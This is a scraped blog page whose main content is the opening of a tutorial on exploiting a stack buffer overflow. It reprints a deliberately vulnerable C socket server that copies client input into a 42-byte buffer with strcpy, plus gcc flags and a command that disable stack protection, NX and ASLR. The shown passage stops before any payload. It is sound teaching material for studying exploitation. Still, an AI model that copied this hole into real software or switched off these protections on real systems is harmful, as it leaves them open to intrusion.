.subscribe-email:focus{color:rgba(255,255,255,0.8);border-color:#0070ff}.widget-subscribe .subscribe-form .subscribe-button{position:absolute;top:10px;right:10px;height:40px;padding:0 15px;font-size:14px}@media only screen and (max-width: 1130px){.widget-subscribe .subscribe-form .subscribe-email{font-size:13px}.widget-subscribe .subscribe-form .subscribe-button{font-size:14px}}.copyright{padding:0 0 30px;margin-top:10px;font-size:13px;font-weight:500;text-align:center;color:#ccc}.copyright a:hover{color:#0070ff}@media only screen and (max-width: 768px){.copyright{text-align:left}}.gallery-box{margin:40px 0}.gallery-box.gallery-footer{margin:0}.gallery-box em{display:block;margin-top:15px;font-size:14px;line-height:22px;font-style:normal;font-weight:normal;text-align:center;color:#fff}.gallery-box em a{border-bottom:1px solid #fff}.gallery-box em a:hover{color:#fff;border-color:#0070ff}.gallery{display:grid;grid-template-columns:repeat(3, auto);justify-content:center;align-content:center;grid-gap:10px}.gallery .gallery__image{background:#131212}.gallery .gallery__image img{display:block;width:100%;height:auto;object-fit:cover}.social{margin:60px 0 0;text-align:center}.social .social__list{display:flex;justify-content:center;align-items:center;flex-wrap:wrap}.social .social__item{display:inline-block;margin:0 2px}.social .social__link{position:relative;z-index:1;padding:0 10px;font-size:21px;line-height:1}.social .social__link:hover{color:#fff}.social .social__link:hover::after{transform:translate3d(-50%, -50%, 0) scale(1)}.social .social__link::after{content:'';display:block;position:absolute;z-index:-1;top:50%;left:50%;transform:translate3d(-50%, -50%, 0) scale(0);width:100%;height:0;padding-bottom:100%;border-radius:50%;background:#0070ff;transition:all .25s}@media only screen and (max-width: 768px){.social{margin:50px 0 0;text-align:left}.social .social__list{justify-content:start}}.hero{padding:60px 0 70px;margin-bottom:70px;background:#161d25}.hero.hero--post .article__meta{margin-bottom:13px;font-size:14px;font-weight:500}.hero.hero--post .article__meta .article__date::before{content:none}.hero.hero--post .article__author-link{font-size:14px;line-height:20px;font-weight:500;color:#ccc}.hero.hero--post .article__author-link span{color:#ccc}.hero.hero--post .article__author-link:hover{color:#fff}.hero.hero--page .hero__title{margin-bottom:0}@media only screen and (max-width: 768px){.hero{padding:60px 0 60px;margin-bottom:60px}}@media only screen and (max-width: 576px){.hero{padding:40px 0 40px;margin-bottom:40px}}.hero__inner{display:flex;align-items:center}@media only screen and (max-width: 768px){.hero__inner{flex-direction:column}}.hero__left,.hero__right{width:50%}@media only screen and (max-width: 768px){.hero__left,.hero__right{width:100%}}.hero__left .hero__title,.hero__left .hero__job{font-size:50px;font-weight:700;letter-spacing:-2px;color:#fff}@media only screen and (max-width: 1130px){.hero__left .hero__title,.hero__left .hero__job{font-size:40px;line-height:1.2}}@media only screen and (max-width: 1024px){.hero__left .hero__title,.hero__left .hero__job{font-size:33px}}@media only screen and (max-width: 576px){.hero__left .hero__title,.hero__left .hero__job{font-size:27px}}.hero__left .hero__title{margin-right:20px;margin-bottom:10px}@media only screen and (max-width: 768px){.hero__left .hero__title{margin-right:0}}.hero__left .hero__job{margin-bottom:20px}.hero__left .hero__name{position:relative;font-weight:400}.hero__left .hero__name::after{content:"";position:absolute;left:0;bottom:0px;width:100%;height:38%;background-color:rgba(0,112,255,0.1)}.hero__left .hero__description{max-width:550px;margin:0;font-size:21px;font-weight:500;color:#ccc}@media only screen and (max-width: 1024px){.hero__left .hero__description{font-size:16px;line-height:26px}}.hero__left .hero__button{margin-top:20px;padding-right:12px;display:inline-block;font-size:16px;line-height:16px;font-weight:700;color:#fff;outline:none;cursor:pointer;transition:all 0.35s}.hero__left .hero__button:hover{color:#fff;background:#0065e6}.hero__left .hero__button .button-arrow{display:inline-block;margin-right:10px;width:30px;height:30px;line-height:30px;text-align:center;color:#fff;background:#0070ff}.hero__right{position:relative}.hero__right::after{content:"";position:absolute;top:50%;transform:translateY(-50%);display:block;width:100%;height:50%;background-image:-webkit-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-moz-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-ms-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);-webkit-background-size:15px 15px;-moz-background-size:15px 15px;background-size:15px 15px}.hero__right .hero__image{position:relative;z-index:10;width:370px;height:470px;margin:0 auto}.hero__right .hero__image::before{content:"";display:block;position:absolute;top:0;z-index:1;width:100%;height:100%;background:#131212}.hero__right .hero__image img{position:absolute;top:0;z-index:1;height:100%;width:100%;object-fit:cover;box-shadow:10px 10px 0 #0070ff;background:#131212}@media only screen and (max-width: 1130px){.hero__right .hero__image{width:270px;height:370px}}@media only screen and (max-width: 1024px){.hero__right .hero__image{width:230px;height:330px}}@media only screen and (max-width: 768px){.hero__right{order:-1}.hero__right .hero__image{width:100%;height:330px;margin-bottom:40px}}@media only screen and (max-width: 576px){.hero__right .hero__image{height:270px;margin-bottom:30px}.hero__right .hero__image img{box-shadow:none}}.contact-head{margin-bottom:30px}.form-box{max-width:750px;margin:0 auto}.form__group{margin-bottom:20px}.form__group:last-child{margin-bottom:0}.form__input{width:100%;padding:20px;font-size:14px;font-weight:500;border:1px solid #131212;outline:none;transition:250ms;resize:vertical;color:rgba(255,255,255,0.8);background:#161d25}.form__input::placeholder{color:rgba(255,255,255,0.8)}.form__input:focus{border:1px solid #0070ff}.article{margin-bottom:30px;border-radius:3px;overflow:hidden;transition:transform .2s}.article:hover{transform:translateY(-3px)}.article__inner{box-shadow:0px 0px 20px rgba(0,0,0,0.05)}.image-wrap{padding:15px 15px 0 15px;background:#161d25}.article__image{position:relative;display:block;height:0;padding-bottom:56.25%;background:#131212;overflow:hidden}.article__image img{position:absolute;width:100%;height:100%;object-fit:cover}.article__content{padding:25px;background:#161d25}.article__title{margin-bottom:10px;font-size:22px;line-height:32px}.article__title a:hover{color:#fff}.article__excerpt{font-size:15px;line-height:24px;font-weight:500;margin-bottom:20px;color:#ccc}.article__meta{display:flex;align-items:center;flex-wrap:wrap;margin-bottom:10px;font-size:13px;font-weight:500;line-height:20px}.article__meta .article__author-link{color:#ccc}.article__meta .article__author-link:hover{color:#fff}.article__meta .article-tags__box{display:flex}.article__meta .article-tags__box::before{content:"/";display:inline-block;margin:0 5px;color:#ccc}.article__meta .article-tags__box .article__tag{color:#ccc}.article__meta .article-tags__box .article__tag:hover{color:#fff}.article__meta .article-tags__box .article__tag::after{content:",";display:inline-block;margin:0 2px}.article__meta .article-tags__box .article__tag:last-child::after{content:none}.article__meta .article__date{color:#ccc}.article__meta .article__date::before{content:"/";display:inline-block;margin:0 5px;color:#ccc}img[src$="centerme"]{display:block;margin:0 auto}.post,.page{max-width:850px;margin:0 auto;color:#fff}.post__content a,.page__content a{text-decoration:underline}.image-box{margin:40px 0}.post__share{margin:50px 0}.post__share .share__list{display:flex;justify-content:center;align-items:center;width:100%}.post__share .share__item{margin:0 2px;text-align:center}.post__share .share__link{display:block;padding:2px 12px;font-size:18px;color:#161d25}.post__share .share__link.share__facebook,.post__share .share__link.share__twitter,.post__share .share__link.share__linkedin,.post__share .share__link.share__pinterest{border:1px solid #131212;background:#161d25}.post__share .share__link.share__facebook:hover,.post__share .share__link.share__twitter:hover,.post__share .share__link.share__linkedin:hover,.post__share .share__link.share__pinterest:hover{color:#fff}.post__share .share__link.share__facebook{color:#3b5998}.post__share .share__link.share__facebook:hover{background:#3b5998}.post__share .share__link.share__twitter{color:#55acee}.post__share .share__link.share__twitter:hover{background:#55acee}.post__share .share__link.share__linkedin{color:#0077b5}.post__share .share__link.share__linkedin:hover{background:#0077b5}.post__share .share__link.share__pinterest{color:#bd081c}.post__share .share__link.share__pinterest:hover{background:#bd081c}@media only screen and (max-width: 576px){.post__share{margin:40px 0}}.post__navigation{display:flex;justify-content:space-between;margin-bottom:20px}.post__navigation .post__prev,.post__navigation .post__next{display:flex;width:48%;padding:25px;margin-bottom:30px;background:#161d25;box-shadow:0px 0px 20px rgba(0,0,0,0.05);transition:transform .2s}.post__navigation .post__prev:hover,.post__navigation .post__next:hover{transform:translateY(-3px)}.post__navigation .post__prev .prev__image,.post__navigation .post__prev .next__image,.post__navigation .post__next .prev__image,.post__navigation .post__next .next__image{position:relative;display:block;width:100px;min-width:100px;height:100px;background-color:#131212}.post__navigation .post__prev .prev__image img,.post__navigation .post__prev .next__image img,.post__navigation .post__next .prev__image img,.post__navigation .post__next .next__image img{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover}.post__navigation .post__prev .prev__image,.post__navigation .post__next .prev__image{margin-right:15px}.post__navigation .post__prev .next__image,.post__navigation .post__next .next__image{margin-left:15px}.post__navigation .post__prev .post__nav,.post__navigation .post__next .post__nav{display:inline-block;margin-bottom:5px;font-size:13px;line-height:1;font-weight:500;color:#ccc}.post__navigation .post__prev .post__nav__title,.post__navigation .post__next .post__nav__title{margin-bottom:0;font-size:18px;line-height:24px}.post__navigation .post__prev .post__nav__title a:hover,.post__navigation .post__next .post__nav__title a:hover{color:#fff}.post__navigation .post__next{text-align:right;margin-left:auto;justify-content:flex-end}@media only screen and (max-width: 768px){.post__navigation{flex-wrap:wrap}.post__navigation .post__prev,.post__navigation .post__next{width:100%}.post__navigation .post__prev{margin-bottom:30px}.post__navigation .next__box{margin-left:auto}}@media only screen and (max-width: 576px){.post__navigation{margin-bottom:10px}.post__navigation .post__prev,.post__navigation .post__next{padding:20px}.post__navigation .post__prev .post__nav__title,.post__navigation .post__next .post__nav__title{font-size:15px;line-height:20px}}.post__comments{padding:40px;box-shadow:0px 0px 20px rgba(0,0,0,0.05);background:#161d25}@media only screen and (max-width: 576px){.post__comments{padding:30px}}.error{margin-bottom:30px;text-align:center}.error .error__title{margin-bottom:0;font-size:100px}.error .error__text{margin-bottom:20px;font-size:21px;color:#ccc}.error .error__button{line-height:45px}.tag{padding:70px 0;margin-bottom:70px;text-align:center;background:#161d25}.tag .tag__meta{font-size:16px;color:#ccc}.tag .tag__title{margin:0;font-size:50px}@media only screen and (max-width: 768px){.tag{padding:60px 0;margin-bottom:60px}}@media only screen and (max-width: 576px){.tag{padding:40px 0;margin-bottom:40px}}
+
+  </style>
+</head>
+
+<body class="dark">
+
+  
+
+    <!-- begin header -->
+<header class="header">
+  <div class="container">
+    <div class="row">
+      <div class="header__inner col col-12">
+
+        <div class="logo">
+          <a class="logo__link" href="/">
+          
+            Artik Blue
+          
+          </a>
+        </div>
+
+        <nav class="main-nav">
+          <div class="main-nav__box">
+            <div class="nav__icon-close">
+              <i class="ion ion-md-close"></i>
+            </div>
+            <div class="nav__title">Menu</div>
+            <ul class="nav__list list-reset">
+              <li class="nav__item">
+                <a href="/" class="nav__link">Home</a>
+              </li>
+              
+                
+              
+                
+                  
+                  <li class="nav__item">
+                    <a href="/about/" class="nav__link">About</a>
+                  </li>
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                  <li class="nav__item">
+                    <a href="/reversing" class="nav__link">Reversing</a>
+                  </li>
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+                
+                  
+                
+              
+            </ul>
+          </div>
+        </nav>
+
+        <div class="nav-buttons">
+          <i class="nav__icon nav__icon-menu ion ion-md-menu"></i>
+          <i class="nav__icon nav__icon-search ion ion-md-search"></i>
+        </div>
+
+      </div>
+    </div>
+  </div>
+  <div class="header__overlay"></div>
+</header>
+<!-- end header -->
+
+<!-- begin search -->
+<div class="search">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+        <div class="search__box">
+          <div class="search__group">
+            <div class="search__close">
+              <i class="ion ion-md-close"></i>
+            </div>
+            <label for="js-search-input" class="screen-reader-text">Search for Blog</label>
+            <input type="text" id="js-search-input" class="search__text" autocomplete="off" placeholder="Type to search...">
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+        <div class="container__inner">
+          <div class="row search-results-list" id="js-results-container"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+<!-- end search -->
+    <!-- begin content -->
+    <main class="content" aria-label="Content">
+      <!-- begin wrapper-page -->
+      <div class="wrapper-page">
+        <!-- begin hero -->
+
+<section class="hero hero--post">
+  <div class="container">
+    <div class="row">
+      <div class="col col-12">
+        <div class="hero__inner">
+          <div class="hero__left">
+            
+
+            <div class="article__meta">
+              <span class="article__date"><time datetime="2020-01-20T23:01:35+01:00">20 Jan 2020</time></span>
+              
+              <div class="article-tags__box">
+                
+                  <a href="/tag/reversing" class="article__tag">reversing</a>
+                
+                  <a href="/tag/c" class="article__tag">c</a>
+                
+                  <a href="/tag/radare" class="article__tag">radare</a>
+                
+              </div>
+              
+            </div>
+
+            <h1 class="hero__title">Reverse engineering x64 binaries with Radare2 - Exploiting basic Buffer Overflows</h1>
+            <a href="/about/" class="article__author-link"><span>By</span> Artik Blue</a>
+
+            
+          </div>
+
+          <div class="hero__right">
+
+            
+            <div class="hero__image">
+              <img class="lazy" data-src="/images//radare2/radare2_20.png" alt="Reverse engineering x64 binaries with Radare2 - Exploiting basic Buffer Overflows">
+            </div>
+
+            
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+<!-- end hero -->
+
+<!-- begin post -->
+<div class="container">
+  <article class="post animate">
+
+    <div class="post__content">
+      <p>And after a very well deserved rest, here we go again. While these tutorials are generally aimed at developing skills in reverse engineergin using open source tools such as radare2 when possible I think that a general knowledge on basic exploitation techniques is a must, as most of the times you’ll find malware using exploits to gain access to the system, you’ll see your own projects failing due to mistakes that can be vulnerabilities and overall knowing about explotation will make things easier for you, as you will get a wider picture.</p>
+
+<p>So as we need to begin with something, we will begin with one of the simplest examples, a buffer overflow on a server program executed inside a x64 Linux system.</p>
+
+<h4 id="stack-buffer-overflows">(stack) Buffer overflows</h4>
+
+<p>A buffer overflow vulnerability is the starting point for exploiting and it appears whenever we try to fill a buffer of size N with content the size &gt;N so whatever we write fills the buffer AND the remains fill the adjacent positions in the stack. Not all buffer overflows have to end in a severe vulnerability, the vulnerability will appear when we start over writting memory positions that are needed for the correct execution of the program, that will lead to a failure. If we are smart enough to carefully identify what are we overwritting and its function in the execution flow of the program, we might be able to control that execution flow and make the machine running the vulnerable software run stuff of our own.</p>
+
+<p>Creating a buffer in C is as simple as the following:</p>
+<pre><code class="language-C">char buffer[50]
+</code></pre>
+<p>That piece of code, as we already know creates an array (buffer) of 50 bytes (char) if we try to write more than 50 bytes there, we have a buffer overflow.</p>
+
+<h4 id="the-stack">The stack</h4>
+
+<p>The stack is a last in first out data structure. Two operations can be done there: PUSH to insert data on TOP and POP to retrieve the first element there (retrieve the element, remove it from the stack). During the execution of a program, a stack is used during function calls to create the associated stack frames for each function call. It also stores the return address of the function, that is the address to which control has to be passed when a function returns.</p>
+
+<p>The following image from buff3r(medium) summarizes it:</p>
+
+<p><img src="https://miro.medium.com/max/1156/1*Io2pbNYn8PeJCpSdNK8O8w.jpeg" alt="Stack" /></p>
+
+<p>As we see, the parameters (arguments) of a function are pushed on the stack followed by the “return address” (that is, the valie un register RIP) and the frame / base pointer (RBP) which points to the base of the previous stack frame. A stack frame is a memory management technique used in some programming languages for generating and eliminating temporary variables. In other words, it can be considered the collection of all information on the stack pertaining to a subprogram call. Stack frames are only existent during the runtime process. .In the x64 world as we know from previous tutorials, the first six arguments are not pushed on the stack at all but stored in registers, in x32 all is pushed on the stack <a href="https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/">read more</a>.</p>
+
+<p>When a function returns, the “saved return address” is “popped” from the stack and loaded inside RIP (instruction pointer) and the execution continues from there. In your typical stack overfflow, you’ll be concerned on how to overwrite this “saved return address” in the stack with another address that’ll point to whenver you want your program to continue the exection, mostly you’ll try to make the program jump to your shellcode (to spawn a shell or something).</p>
+
+<p>So let’s get our hands into it. In this example we will be using the <a href="https://github.com/dennis95stumm/Vulnerable-Server">Vulnerable Server</a> that’s a server written in C which is vulnerable to several very basic attacks. We can download and compile it inside a, for example ubuntu 18.04 LTS x64 bits.</p>
+
+<pre><code class="language-C">/**
+ * @file smart_server.c
+ * @author Dennis Stumm
+ * @brief This file contains a vulnerable socket server. To run the server
+ *   compile it and start with as following: ./NAME PORTNUMBER
+ * @version 1.0
+ * @date 2020-02-04
+ * 
+ * @copyright Copyright (c) 2020 Dennis Stumm
+ *******************************************************************************
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see &lt;https://www.gnu.org/licenses/&gt;.
+ *******************************************************************************
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+
+/**
+ * @brief Sends the secret message over the passed socket.
+ *
+ * @param fd Socket to send the message over.
+ */
+void egg(int fd) {
+  char *message = "\x20\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
+    "\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x20\x0a\x7c\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3b\x3b\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x27\x7e\x7c\x7c\x7e\x7e\x7e\x60\x60\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x27\x20\x20"
+    "\x20\x2e\x27\x3a\x20\x20\x20\x20\x20\x6f\x60\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x27\x20\x6f\x6f\x20\x7c\x20\x7c"
+    "\x6f\x20\x20\x6f\x20\x20\x20\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a"
+    "\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x20\x38\x20\x20\x2e\x27\x2e\x27\x20\x20\x20\x20"
+    "\x38\x20\x6f\x20\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x20\x38\x20\x20\x7c\x20\x7c\x20\x20\x20\x20\x20\x38\x20\x20\x20"
+    "\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x20\x5f\x2e\x5f\x7c\x20\x7c\x5f\x2c\x2e\x2e\x2e\x38\x20\x20\x20\x20\x3a\x3a\x3a"
+    "\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x27\x7e\x2d\x2d\x2e"
+    "\x20\x20\x20\x2e\x2d\x2d\x2e\x20\x60\x2e\x20\x20\x20\x60\x3a\x3a\x3a\x3a\x3a\x3a"
+    "\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x27\x20\x20\x20\x20\x20\x3d\x38\x20\x20"
+    "\x20\x20\x20\x7e\x20\x20\x5c\x20\x6f\x20\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a"
+    "\x7c\x3a\x3a\x3a\x3a\x27\x20\x20\x20\x20\x20\x20\x20\x38\x2e\x5f\x20\x38\x38\x2e"
+    "\x20\x20\x20\x5c\x20\x6f\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a"
+    "\x27\x20\x20\x20\x5f\x5f\x2e\x20\x2c\x2e\x6f\x6f\x6f\x7e\x7e\x2e\x20\x20\x20\x20"
+    "\x5c\x20\x6f\x60\x3a\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x20\x20\x20\x2e"
+    "\x20\x2d\x2e\x20\x38\x38\x60\x37\x38\x6f\x2f\x3a\x20\x20\x20\x20\x20\x5c\x20\x20"
+    "\x60\x3a\x3a\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x27\x20\x20\x20\x20\x20\x2f\x2e\x20"
+    "\x6f\x20\x6f\x20\x5c\x20\x3a\x3a\x20\x20\x20\x20\x20\x20\x5c\x38\x38\x60\x3a\x3a"
+    "\x3a\x3a\x7c\x0a\x7c\x3a\x3b\x20\x20\x20\x20\x20\x6f\x7c\x7c\x20\x38\x20\x38\x20"
+    "\x7c\x64\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x60\x38\x20\x60\x3a\x3a\x3a\x7c\x0a"
+    "\x7c\x3a\x2e\x20\x20\x20\x20\x20\x20\x20\x2d\x20\x5e\x20\x5e\x20\x2d\x27\x20\x20"
+    "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x60\x2d\x60\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x2e"
+    "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x20\x20\x20\x20\x20\x2e\x3a\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x2e\x2e"
+    "\x2e\x2e\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x3a\x3a\x27\x20\x20\x20"
+    "\x20\x20\x60\x60\x3a\x3a\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x3a\x2d\x27\x60"
+    "\x2d\x20\x20\x20\x20\x20\x20\x20\x20\x38\x38\x20\x20\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x60\x7c\x0a\x7c\x3a\x3a\x3a\x3a\x3a\x2d\x27\x2e\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x20\x20\x2d\x20\x20\x20\x20\x20\x20\x20\x3a\x3a\x20\x20\x20\x20\x20\x7c\x0a"
+    "\x7c\x3a\x2d\x7e\x2e\x20\x2e\x20\x2e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
+    "\x20\x20\x20\x20\x20\x20\x20\x20\x3a\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x2e\x2e"
+    "\x20\x2e\x20\x20\x20\x2e\x2e\x3a\x20\x20\x20\x6f\x3a\x38\x20\x20\x20\x20\x20\x20"
+    "\x38\x38\x6f\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x2e\x20\x2e\x20\x20\x20\x20"
+    "\x20\x3a\x3a\x3a\x20\x20\x20\x38\x3a\x50\x20\x20\x20\x20\x20\x64\x38\x38\x38\x2e"
+    "\x20\x2e\x20\x2e\x20\x20\x7c\x0a\x7c\x2e\x20\x20\x20\x2e\x20\x20\x20\x3a\x38\x38"
+    "\x20\x20\x20\x38\x38\x20\x20\x20\x20\x20\x20\x38\x38\x38\x27\x20\x20\x2e\x20\x2e"
+    "\x20\x20\x7c\x0a\x7c\x20\x20\x20\x6f\x38\x20\x20\x64\x38\x38\x50\x20\x2e\x20\x38"
+    "\x38\x20\x20\x20\x27\x20\x64\x38\x38\x50\x20\x20\x20\x2e\x2e\x20\x20\x20\x7c\x0a"
+    "\x7c\x20\x20\x38\x38\x50\x20\x20\x38\x38\x38\x20\x20\x20\x64\x38\x50\x20\x20\x20"
+    "\x27\x20\x38\x38\x38\x20\x20\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x20\x20"
+    "\x38\x20\x20\x64\x38\x38\x50\x2e\x27\x64\x3a\x38\x20\x20\x2e\x2d\x20\x64\x50\x7e"
+    "\x20\x6f\x38\x20\x20\x20\x20\x20\x20\x20\x7c\x0a\x7c\x20\x20\x20\x20\x20\x20\x38"
+    "\x38\x38\x20\x20\x20\x38\x38\x38\x20\x20\x20\x20\x64\x7e\x20\x6f\x38\x38\x38\x20"
+    "\x20\x20\x20\x4c\x53\x20\x7c\x0a\x7c\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
+    "\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f\x5f"
+    "\x5f\x5f\x7c";
+  send(fd, message, strlen(message), 0);
+}
+
+/**
+ * @brief Checks whether the passed text equals to the secret text.
+ * 
+ * @param secret Text to check against the secret text.
+ * @return int 0 if the passed text isn't correct, 1 otherwhise.
+ */
+int checkAuth(char *secret) {
+  char secret_buffer[42];
+  int auth_flag = 0;
+
+  strcpy(secret_buffer, secret);
+
+  if (strcmp(secret_buffer, "You don't know the power of the dark side") == 0)
+    auth_flag = 1;
+
+  return auth_flag;
+}
+
+/**
+ * @brief Handles an incoming connection to the server.
+ * 
+ * @param sock The socket to handle the connection on.
+ */
+void handleConnection(int sock) {
+  struct sockaddr_in client;
+  socklen_t len;
+  char *message;
+  int fd, recv_size;
+  char secret_buffer[1024];
+
+  len = sizeof(client);
+  fd = accept(sock, (struct sockaddr*) &amp;client, &amp;len);
+  if (fd &lt; 0) {
+    printf("Error acepting\n");
+    exit(-1);
+  }
+
+  printf("Got connection!\n");
+  message = "Welcome! Please enter the secret text:\n";
+  send(fd, message, strlen(message), 0);
+  recv_size = recv(fd, secret_buffer, 1024, 0);
+
+  if (recv_size &lt;= 0) {
+    printf("Connection close!\n");
+    close(fd);
+    return;
+  }
+  
+  secret_buffer[recv_size-1] = '\0';
+  
+  while (!checkAuth(secret_buffer)) {
+    message = "The secret was wrong, please try again:\n";
+    send(fd, message, strlen(message), 0);
+    recv_size = recv(fd, secret_buffer, 1024, 0);
+
+    if (recv_size &lt;= 0) {
+      printf("Connection close!\n");
+      close(fd);
+      return;
+    }
+
+    secret_buffer[recv_size-1] = '\0';
+  }
+
+  egg(fd);
+
+  printf("Connection close!\n");
+  close(fd);
+}
+
+/**
+ * @brief Starts a socket server listening on the passed port on any ip address.
+ * 
+ * @param port Portnumber the socket server should listen on.
+ */
+void start(int port) {
+  struct sockaddr_in server;
+  int sock;
+  
+  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (sock &lt; 0) {
+    printf("Error opening socket\n");
+    exit(-1);
+  }
+
+  server.sin_port = htons(port);
+  server.sin_addr.s_addr = INADDR_ANY;
+  server.sin_family = AF_INET;
+
+  if (bind(sock, (struct sockaddr*) &amp;server, sizeof(server)) &lt; 0) {
+    printf("Error binding socket\n");
+    exit(-1);
+  }
+
+  if (listen(sock, 5) == -1) {
+    printf("Error listening\n");
+    exit(-1);
+  }
+
+  printf("Waiting for connections...\n");
+  
+  while (1) {
+    fflush(stdout);
+    handleConnection(sock);
+  }
+}
+
+/**
+ * @brief Main function that calls the function to start the socket server.
+ * 
+ * @param argc Number of arguments passed to the application.
+ * @param argv Array containing the arguments passed to the application.
+ * @return int Status with which the application finishes.
+ */
+int main(int argc, char* argv[]) {
+  if (argc != 2) {
+    printf("Usage: %s PORT \n", argv[0]);
+    return 0;
+  }
+
+  start(atoi(argv[1]));
+
+  return 0;
+}
+</code></pre>
+
+<p>We’ll have to compile it the following way:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -fno-stack-protector -no-pie -z execstack
+</code></pre></div></div>
+<p>As otherwise, we’ll face more advanced protection measures against this kind of basic attacks. As for example, by default DEP marks sections of the memory of our programs such as the stack as non executable, so we can overflow the stack but do nothing on it. Canaries can also be used to mark buffer sections and thus detect if buffer overflows are happening and kill the program to avoid the exploit. <a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection">Read about them</a>. By using the params/flags presented in the gcc command, we make sure we can play with our vulnerable server and replicate this tutorial.</p>
+
+<p>You may also want to disable ASLR for this one:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</code></pre></div></div>
